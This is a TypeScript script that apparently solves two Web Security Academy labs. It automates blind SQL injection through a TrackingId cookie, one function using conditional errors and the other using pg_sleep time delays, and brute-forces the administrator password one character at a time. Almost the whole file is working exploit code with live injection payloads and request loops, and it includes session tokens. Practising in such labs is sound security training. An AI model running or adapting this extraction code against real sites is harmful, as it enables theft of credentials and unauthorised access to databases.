const letters = Array(26)
  .fill(0)
  .map((_, i) => String.fromCharCode(97 + i));
const numbers = Array(10)
  .fill(0)
  .map((_, i) => `${i}`);
const passwordChars = letters.concat(numbers);

async function Blind_SQL_injection_with_conditional_errors() {
  const config = {
    trackingId: "YUw5DjjA1NCBljlO",
    session: "V6YewNgxfiwzhe7iiBEvX9APoGifBlir",
    url: "https://0ad700fd041d3040808f0d46009c0089.web-security-academy.net/",
    passwordLength: 20,
  };
  const password: string[] = [];
  for (let i = 0; i < config.passwordLength; i++) {
    for (const passwordChar of passwordChars) {
      console.log({ i, passwordChar });
      const response = await fetch(config.url, {
        headers: {
          cookie: `session=${config.session}; TrackingId=${config.trackingId}' AND (SELECT CASE WHEN (SUBSTR(password, ${i + 1}, 1) = '${passwordChar}') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator') = 'a`,
        },
      });
      if (response.status === 500) {
        password[i] = passwordChar;
        break;
      }
    }
  }
  console.log("result");
  console.log(password.join(""));
}

// Blind_SQL_injection_with_conditional_errors();

async function Blind_SQL_injection_with_time_delays_and_information_retrieval() {
  const config = {
    session: "o2anaO8pgQrKwriqAe5KQA1oXfkaAIol",
    url: "https://0acd00a6044b2fe980f6f325009d002b.web-security-academy.net/",
    passwordLength: 20,
    sleepSeconds: 5,
  };
  const password: string[] = [];
  for (let i = 0; i < config.passwordLength; i++) {
    for (const passwordChar of passwordChars) {
      console.log({ i, passwordChar });
      const timeStart = new Date().getTime();
      await fetch(config.url, {
        headers: {
          cookie: `session=${config.session}; TrackingId=' OR (SELECT CASE WHEN SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), ${i + 1}, 1) = '${passwordChar}' THEN pg_sleep(${config.sleepSeconds}) ELSE pg_sleep(0) END) IS NULL--`,
        },
      });
      const timeEnd = new Date().getTime();
      if (timeEnd - timeStart > config.sleepSeconds * 1000) {
        console.log(`find password position ${i + 1}: ${passwordChar}`);
        password[i] = passwordChar;
        break;
      }
    }
  }
  console.log("result");
  console.log(password.join(""));
}

Blind_SQL_injection_with_time_delays_and_information_retrieval();
